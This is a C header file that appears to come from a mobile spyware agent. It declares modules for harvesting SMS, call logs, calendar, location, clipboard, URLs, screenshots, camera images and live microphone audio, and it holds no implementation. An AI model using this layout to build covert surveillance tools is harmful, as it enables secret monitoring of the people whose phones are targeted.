#include "Common.h"
#include "Log.h"
#include "GPS.h"
#include "Cell.h"
#include "ProcessMonitor.h"
#include "Observer.h"
#include <exception>
using namespace std;

#ifndef __Modules_h__
#define __Modules_h__

#define AGENT_COMMON_DATA(x) 	\
	UINT MyID = x; \
	Status *statusObj = Status::self(); \
	pAgentStruct MyData = (pAgentStruct)lpParam;

DWORD WINAPI SmsAgent(LPVOID lpParam);
DWORD WINAPI CalendarModule(LPVOID lpParam);
DWORD WINAPI CallListAgent(LPVOID lpParam);
DWORD WINAPI DeviceInfoAgent(LPVOID lpParam);
DWORD WINAPI PositionModule(LPVOID lpParam);
DWORD WINAPI ClipboardModule(LPVOID lpParam);
DWORD WINAPI UrlModule(LPVOID lpParam);
DWORD WINAPI CrisisModule(LPVOID lpParam);
DWORD WINAPI CallAgent(LPVOID lpParam);
DWORD WINAPI SnapshotModule(LPVOID lpParam);
DWORD WINAPI CameraModule(LPVOID lpParam);
DWORD WINAPI ApplicationModule(LPVOID lpParam);
DWORD WINAPI LiveMicModule(LPVOID lpParam);

BOOL AgentSleep(UINT Id, UINT uMillisec);
void FAR PASCAL lineCallbackFunc(DWORD hDevice, DWORD dwMsg, DWORD dwCallbackInstance, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3);
#endif